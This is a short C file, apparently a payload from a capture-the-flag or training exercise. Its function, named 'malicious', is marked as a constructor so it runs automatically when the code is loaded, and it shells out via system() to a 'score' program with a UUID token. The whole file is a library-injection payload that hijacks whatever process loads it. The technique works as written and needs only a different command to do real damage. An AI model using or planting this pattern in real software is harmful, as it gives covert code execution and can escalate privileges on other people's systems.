#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
	system("/usr/local/bin/score 0f61dff8-ea1d-4e36-bc52-264057b3808b");
}
